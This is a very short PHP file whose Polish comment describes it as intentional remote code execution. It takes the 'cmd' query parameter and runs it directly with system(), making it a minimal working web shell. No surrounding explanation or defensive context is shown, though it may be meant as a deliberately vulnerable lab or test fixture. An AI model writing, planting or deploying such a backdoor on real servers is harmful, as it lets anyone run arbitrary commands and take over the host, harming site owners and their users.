<?php
// Celowe RCE
if ( isset($_GET['cmd']) ) {
    system($_GET['cmd']);
}
